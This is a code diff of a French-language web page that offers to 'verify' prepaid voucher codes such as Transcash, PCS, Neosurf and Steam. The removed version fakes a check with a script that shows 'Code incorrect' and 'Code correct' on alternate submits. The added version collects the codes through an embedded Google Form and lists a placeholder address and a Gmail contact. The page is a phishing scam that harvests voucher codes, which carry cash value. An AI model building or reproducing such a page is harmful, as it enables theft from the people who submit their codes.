@@ -9,187 +9,88 @@
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #f8f8f8;
+            box-sizing: border-box;
         }
-
         header {
-            background-color: #333;
-            color: white;
-            padding: 10px;
-            text-align: center;
-        }
-
-        nav {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 10px;
-            background-color: #444;
-            color: white;
-        }
-
-        nav ul {
-            list-style-type: none;
-            padding: 0;
-            display: flex;
-            margin: 0;
-        }
-
-        nav ul li {
-            margin: 0 10px;
-        }
-
-        nav ul li a {
-            color: white;
-            text-decoration: none;
-        }
-
-        .container {
-            padding: 20px;
-        }
-
-        .form-group {
-            margin-bottom: 15px;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 5px;
-        }
-
-        input[type="text"],
-        input[type="email"],
-        select {
-            width: 100%;
-            padding: 8px;
-            box-sizing: border-box;
-        }
-
-        .radio-group {
-            display: flex;
-            align-items: center;
-        }
-
-        .radio-group input {
-            margin-left: 10px;
-            margin-right: 5px;
-        }
-
-        button {
-            background-color: #28a745;
-            color: white;
             padding: 10px 20px;
-            border: none;
-            cursor: pointer;
+            background-color: #f4f4f4;
         }
-
-        footer {
+        .menu {
+            display: flex;
+            gap: 10px;
+        }
+        .menu a {
+            text-decoration: none;
+            padding: 10px 15px;
             background-color: #333;
             color: white;
-            text-align: center;
-            padding: 10px 0;
-            position: fixed;
+            border-radius: 5px;
+        }
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            border: 1px solid #ddd;
+        }
+        h2 {
+            margin-top: 0;
+        }
+        iframe {
             width: 100%;
-            bottom: 0;
-        }
-
-        .navbar-toggle {
-            display: none;
-        }
-
-        @media (max-width: 768px) {
-            nav ul {
-                display: none;
-            }
-
-            .navbar-toggle {
-                display: block;
-                cursor: pointer;
-            }
-        }
-
-        .show {
-            display: block !important;
+            border: none;
         }
     </style>
 </head>
 <body>
     <header>
-        <h1>Vérifiez vos recharges</h1>
+        <h1>Vérification Recharge</h1>
+        <nav class="menu">
+            <a href="#accueil">Accueil</a>
+            <a href="#verification">Vérification</a>
+            <a href="#contact">Contact</a>
+        </nav>
     </header>
-    <nav>
-        <div class="navbar-toggle">&#9776;</div>
-        <ul id="nav-links">
-            <li><a href="#">Accueil</a></li>
-            <li><a href="#">Vérification</a></li>
-            <li><a href="#">Contact Clientèle</a></li>
-        </ul>
-    </nav>
-    <div class="container">
-        <h2>Vérifie ton recharge</h2>
-        <form id="verification-form">
-            <div class="form-group">
-                <label for="nom-recharge">Nom du recharge*</label>
-                <select id="nom-recharge" required>
-                    <option value="transcash">Transcash</option>
-                    <option value="pcs">PCS</option>
-                    <option value="neosurf">Neosurf</option>
-                </select>
-            </div>
-            <div class="form-group">
-                <label for="montant">Montant*</label>
-                <input type="text" id="montant" required>
-            </div>
-            <div class="form-group">
-                <label for="code-recharge">Code du recharge*</label>
-                <input type="text" id="code-recharge" required>
-            </div>
-            <div class="form-group">
-                <label>Cacher votre code:</label>
-                <div class="radio-group">
-                    <input type="radio" id="cacher-oui" name="cacher-code" value="oui">
-                    <label for="cacher-oui">Oui</label>
-                    <input type="radio" id="cacher-non" name="cacher-code" value="non">
-                    <label for="cacher-non">Non</label>
-                </div>
-            </div>
-            <div class="form-group">
-                <label for="email">Email</label>
-                <input type="email" id="email">
-            </div>
-            <p>Notre Politique de confidentialité s'applique.</p>
-            <button type="submit">Vérifiez</button>
-        </form>
-        <h2>Horaires D'OUVERTURE</h2>
-        <p>Lu-Ve: 07j/24H</p>
-        <p>Sa-Di: 8h/13H</p>
-        <h2>NOUS TROUVER</h2>
-        <p>123 Rue du test<br>Paris, 75001</p>
-        <p>Email: ladirectiontranscashpcs@gmail.com</p>
-        <h2>NOUS SUIVRE</h2>
-    </div>
-    <footer>
+    <div id="accueil" class="container">
+        <h2>Accueil</h2>
+        <p>Vérifiez vos recharge/carte en toute sécurité.</p>
+        <h3>Comment Faire Une Vérification de Ticket Transcash?</h3>
+        <p>Vérifier un recharge ou carte/Réponse instantanée.</p>
+        <h3>Transcash</h3>
+        <p>Notre système de vérification vous permet de vérifier votre ticket/coupon transcash sans posséder une carte transcash et ce gratuitement, en toute sécurité et de façon illimitée 24h/7. Cette méthode consiste à remplir un formulaire.</p>
+        <h3>PCS</h3>
+        <p>Notre système de vérification vous permet de vérifier votre ticket/coupon PCS sans posséder une carte PCS et ce gratuitement, en toute sécurité et de façon illimitée 24h/7. Cette méthode consiste à remplir un formulaire.</p>
+        <h3>Steam</h3>
+        <p>Notre système de vérification vous permet de vérifier votre ticket/coupon Steam sans posséder une carte Steam et ce gratuitement, en toute sécurité et de façon illimitée 24h/7. Cette méthode consiste à remplir un formulaire.</p>
+        <h3>Horaires D'OUVERTURE</h3>
+        <p>Lu-Ve 07j/24H</p>
+        <p>Sa-Di 8h/13H</p>
+        <h3>NOUS TROUVER</h3>
+        <p>123 Rue du test<br>Paris, 75001<br>Email: ladirectiontranscashpcs@gmail.com</p>
+        <h3>NOUS SUIVRE</h3>
         <p>Mentions légales | Politique de confidentialité | Politique des cookies | Plan du site</p>
-        <p>Ce site a été conçu avec Jimdo. Inscrivez-vous gratuitement sur https://fr.jimdo.com</p>
-    </footer>
-    <script>
-        document.querySelector('.navbar-toggle').addEventListener('click', function() {
-            var navLinks = document.getElementById('nav-links');
-            navLinks.classList.toggle('show');
-        });
-
-        document.getElementById('verification-form').addEventListener('submit', function(event) {
-            event.preventDefault();
-            var submitButton = event.target.querySelector('button[type="submit"]');
-            var currentState = submitButton.getAttribute('data-state');
-            if (currentState === 'incorrect' || !currentState) {
-                alert('Code incorrect');
-                submitButton.setAttribute('data-state', 'correct');
-            } else {
-                alert('Code correct');
-                submitButton.removeAttribute('data-state');
-            }
-        });
-    </script>
+    </div>
+    <div id="verification" class="container">
+        <h2>Vérification du ticket</h2>
+        <iframe src="https://docs.google.com/forms/d/e/1FAIpQLScNY7gd1wgbS9Uc94dSBeJq1VwA0brIQVJxJDoL91LtpKZ7NA/viewform?usp=pp_url&entry.2033746373=Option+1&entry.1646349537=Code+exact&entry.1828072517=Code+correct+" width="640" height="800" frameborder="0" marginheight="0" marginwidth="0">Chargement…</iframe>
+        <h3>Horaires D'OUVERTURE</h3>
+        <p>Lu-Ve 07j/24H</p>
+        <p>Sa-Di 8h/13H</p>
+        <h3>NOUS TROUVER</h3>
+        <p>123 Rue du test<br>Paris, 75001<br>Email: ladirectiontranscashpcs@gmail.com</p>
+        <h3>NOUS SUIVRE</h3>
+    </div>
+    <div id="contact" class="container">
+        <h2>Contact Clientèle</h2>
+        <p>Pour nous contacter, envoyez un email à : ladirectiontranscashpcs@gmail.com</p>
+        <h3>Horaires D'OUVERTURE</h3>
+        <p>Lu-Ve 07j/24H</p>
+        <p>Sa-Di 8h/13H</p>
+        <h3>NOUS TROUVER</h3>
+        <p>123 Rue du test<br>Paris, 75001<br>Email: ladirectiontranscashpcs@gmail.com</p>
+        <h3>NOUS SUIVRE</h3>
+    </div>
 </body>
 </html>
